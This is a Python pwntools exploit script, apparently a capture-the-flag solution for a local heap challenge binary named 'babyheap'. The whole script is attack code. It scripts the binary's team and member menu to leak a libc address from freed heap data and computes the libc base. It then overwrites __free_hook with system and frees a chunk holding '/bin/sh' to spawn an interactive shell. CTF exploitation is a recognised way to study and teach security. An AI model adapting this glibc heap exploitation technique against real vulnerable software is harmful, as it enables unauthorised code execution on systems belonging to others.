from pwn import *

r = process('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def create_team(length, desc):
	r.recvuntil('>')
	r.sendline('1')
	r.recvuntil(':')
	r.sendline(str(length))
	r.recvuntil(':')
	r.sendline(desc)

def manage_team(index):
	r.recvuntil('>')
	r.sendline('3')
	r.recvuntil(':')
	r.sendline(str(index))

def add_member(length, name, desc, keep=True):
	r.recvuntil('>')
	r.sendline('1')
	r.recvuntil(':')
	r.sendline(str(length))

	if not keep:
		return

	for i in range(length):
		r.recvuntil(':')
		r.sendline(name)
		r.recvuntil(':')
		r.sendline(desc)

def delete_member(index):
	r.recvuntil('>')
	r.sendline('2')
	r.recvuntil(':')
	r.sendline(str(index))

def list_member():
	r.recvuntil('>')
	r.sendline('3')
	return r.recvuntil('1. Add Member', drop=True)

def manage_member(index, desc):
	r.recvuntil('>')
	r.sendline('4')
	r.recvuntil(':')
	r.sendline(str(index))
	r.sendline(desc)


def return_to_team():
	r.recvuntil('>')
	r.sendline('5')

def get_libc(text):
	desc = 'Description : '
	while text.find(desc) != -1:
		text = text[text.find(desc) + len(desc):]
		t = text[:text.find('Memebr')]
		if t.find('\x7f') != -1:
			t = t.split('\n')[1].ljust(8, '\x00')
			return u64(t)

create_team(24, 'A')
manage_team(0)

add_member(5, '/bin/sh\x00', '/bin/sh\x00')
delete_member(3)
delete_member(1)
add_member(2, 'a' * 7, 'a' * 7)

libc.address = get_libc(list_member()) - 0x3c1878

log.info('libc_base : ' + hex(libc.address))
log.info('__free_hook : ' + hex(libc.symbols['__free_hook']))
log.info('system addr : ' + hex(libc.symbols['system']))

add_member(19, 'b' * 7, 'a' * 7) # realloc
add_member(230, '', '', False) # realloc(0)

return_to_team()

create_team(0xd8, p64(libc.symbols['__free_hook']))
manage_team(0)

manage_member(0, p64(libc.symbols['system']))
delete_member(4) #free trigger 

r.interactive()
